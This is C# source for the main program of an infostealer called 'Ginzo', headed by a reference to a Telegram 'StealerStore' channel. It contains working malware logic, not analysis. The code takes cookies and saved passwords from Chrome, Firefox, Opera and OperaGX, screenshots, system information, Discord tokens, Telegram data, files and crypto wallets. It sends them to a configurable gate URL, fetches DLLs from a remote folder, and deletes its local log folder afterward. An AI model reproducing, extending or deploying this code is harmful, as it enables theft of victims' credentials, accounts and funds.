//t.me/StealerStore

using System;
using System.IO;

namespace Ginzo
{
    internal class Program
    {
        public static string HostLink = "http://domain.com/gate.php"; // сюда хост http://domain.com/gate.php
        public static string DLLFolder = "http://domain.com/DLL/"; // сюда папку с дллками http://domain.com/DLL/
        static void Main()
        {
            DateTime today = DateTime.Now;
            if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\" + "ChromeUploadTime.txt"))
            {
                DateTime lastrundate = DateTime.Parse(File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\" + "ChromeUploadTime.txt"));
                if (today > lastrundate)
                {
                    Console.WriteLine("AntiRepeat worked!");
                    RunSteal();
                } 
                else 
                {
                    Console.WriteLine("Launched within the last week!");
                    Environment.Exit(0); 
                }
            } else { RunSteal(); }
        }

        static void RunSteal()
        {
            // installation libraries
            Installing.Library();
            // prepare folders and other
            Preparing.PrepareAll();
            Information.Screenshot();
            Information.DownloadXML();
            // grab browsers cookies
            Ginzo.Stealer.Browsers.Cookies.Chrome();
            Ginzo.Stealer.Browsers.Cookies.Firefox();
            Ginzo.Stealer.Browsers.Cookies.Opera();
            Ginzo.Stealer.Browsers.Cookies.OperaGX();
            Console.WriteLine("All cookies count: " + Ginzo.Stealer.Browsers.Cookies.GetCookiesCount());
            // gram browser passwords
            Ginzo.Stealer.Browsers.Passwords.Chrome();
            Ginzo.Stealer.Browsers.Passwords.Firefox();
            Ginzo.Stealer.Browsers.Passwords.Opera();
            Ginzo.Stealer.Browsers.Passwords.OperaGX();
            Console.WriteLine("All passwords count: " + Ginzo.Stealer.Browsers.Passwords.GetPasswordsCount());
            // getting information about pc
            Information.SystemInformation();
            Information.DiscordGetToken();
            Files.GetFiles(Preparing.LogPath);
            Telegram.Start();
            CryptoWallets.GetWallets();
            // delete log path
            Ginzo.Stealer.Methods.Request.Sending();
            Directory.Delete(Preparing.LogPath, true);
        }
    }
}

